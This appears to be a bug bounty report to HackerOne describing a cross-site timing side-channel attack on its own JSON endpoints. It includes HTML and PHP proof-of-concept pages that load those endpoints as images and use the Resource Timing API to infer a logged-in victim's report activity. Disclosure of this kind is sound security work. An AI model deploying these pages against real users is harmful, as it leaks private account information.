During the research I have employed the https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API . From the API we can read the load time for certain resource and having few another conditions enabled on some web api / endpoints we can get valuable conclusions. Check the following snippet:\n```\n\u003chtml\u003e\n\u003chead\u003e\n\u003cscript\u003e\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length \u003c= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i \u003c resources.length; i++) {\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n }\n}\n\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cimg id=\"grr\" src=\"https://hackerone.com/bugs.json?text_query=3%08\u0026subject=%01\u0026sort_type=upvotes\u0026substates%5B%5D=spam\"\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n1. Host it on \"attacker\" domain\n2. If you are logged in on HackerOne and you visit attacker domain the script will work e.g. 200 response code will cause the script to measure the load time, if not load time won't be shown ( http 400, 500 status codes)\n3. Find interesting endpoints that could deliver conclusions or static data that could help in future.\n\nDetailed description:\n\nAt the moment will deliver always constant output for any logged in user ~750b: https://hackerone.com/bugs.json?text_query=999999\u0026subject=\u0026sort_type=pg_search_rank\u0026substates%5B%5D=triaged  \n\nThis one too ~9200b : https://hackerone.com/programs/search.json?query=IBB\u0026sort=published_at%3Adescending\u0026page=1\n\nThis means we as logged in users could measure the average size in bytes from those two responses and this values are almost the same for any logged in user on HackerOne.\n\nNow when victim ( logged in on HackerOne ) visits the \"attacker\" web site, the attacker web site could measure the time needed for many calls towards this endpoints =\u003e we can get idea regarding the internet speed of victim e.g.\n\nMeasure average page load for search.json with this script 1.php ( host it, visit it logged on H1 and type `calculate_load_times()` in browser console )\n```\n\u003chtml\u003e\n\u003chead\u003e\n\u003cscript\u003e\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length \u003c= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i \u003c resources.length; i++) {\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n  }\n}\n\u003c/script\u003e\n\u003c/head\u003e\n\u003c!-- https://hackerone.com/programs/search?query=test\u0026sort=published_at%3Adescending\u0026page=1 --\u003e\n\u003cbody\u003e\n\u003c?php\nfor ($i=0;$i\u003c30;$i++){\necho '\u003cimg id=grr\"'.$i.'\" src=\"https://hackerone.com/programs/search.json?query=IBB\u0026sort=published_at%3Adescending\u0026page=1\u0026rnd='.rand(1,5000).'\"\u003e\n';\n}\n?\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\nSame for bugs.json with following 2.php (host it, visit it logged on H1 and type `calculate_load_times()` in browser console )\n```\n\u003chtml\u003e\n\u003chead\u003e\n\u003cscript\u003e\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length \u003c= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i \u003c resources.length; i++) {\n    \n\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n\n    \n  }\n}\n\u003c/script\u003e\n\u003c/head\u003e\n\u003c!-- https://hackerone.com/programs/search?query=test\u0026sort=published_at%3Adescending\u0026page=1 --\u003e\n\u003cbody\u003e\n\u003c?php\nfor ($i=0;$i\u003c30;$i++){\necho '\u003cimg id=grr\"'.$i.'\" src=\"https://hackerone.com/bugs.json?text_query=999999\u0026subject=\u0026sort_type=pg_search_rank\u0026substates%5B%5D=triaged\u0026rnd='.rand(1,5000).'\"\u003e';\n}\n?\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\nNow having this values about the load time we can simple calculate the average time for loading for each of the `img` elements =\u003e we can calculate approximately the internet speed of the victim towards HackerOne endpoints at that moment. Having the approximate internet speed and chance for measuring time needed for load of some interesting resource we can learn from this side channel attack if victim have created report in the last few days: https://hackerone.com/bugs.json?text_query=3480\u0026subject=\u0026sort_type=pg_search_rank\u0026substates%5B%5D=new\nor\nhttps://hackerone.com/bugs.json?text_query=3479\u0026subject=\u0026sort_type=pg_search_rank\u0026substates%5B%5D=new\n...\nUsing the same scripts from above with specified urls. In this last urls exploiting fact is the guessing the time of the report based on report id.\nFrom measured time, we can get conclusion even for the number of reports / records in the response if we divide the content size with average size of one (json) record. :)\n\nAs extra, this kind of attacks could be performed against H1 programs in order to get knowledge if some program have triaged reports, new, closed, ...  \n\nI have performed PoC calculations based on 30 requests per endpoint from my localhost and works like a charm :)\n\n### Optional: Your Environment (Browser version, Device, etc)\n\n * any modern browser\n\n### Optional: Supporting Material/References (Screenshots)\n\n * https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API\n\n## Impact\n\nAny endpoint on the net is vulnerable on this type of attack due the fact it is side channel attack which could be prevented only if CSRF tokens are supplied in the request as variables. This way, using this attack approach could be ex filtrated /learned many many information from visiting users who are logged in on services that host sensitive data regarding them.

If I send some link toward someone and I want to know how many reports are new, triaged, closed in certain period of time  ( id of the report is incremental numeric value ).\n\nSo, in order to get the right answer regarding this information ( victim number of reports per type / period of time ) we need to measure the following:\n\na. Timing towards \"empty\" response e.g. https://hackerone.com/bugs.json?text_query=99999999999999999999\u0026subject=\u0026sort_type=pg_search_rank\u0026substates%5B%5D=triaged\nb.

From (a) timing results we get knowledge regarding the internet speed of the victim towards H1 servers at the time\n3. From (b) timing we derive the results in the form of response size and due the fact we can estimate each record size =\u003e we have number of records.\n\nI think not it is more clear why this report is very very different than another ones. \n - It strictly says that need to be added CSRF tokens in the request.   \n - It exploits the report id as time traveling value \n\nRegarding the statement that root cause is already reported I would like to state that my approach most probably has already pushed updates towards the system and those reports are very very old.
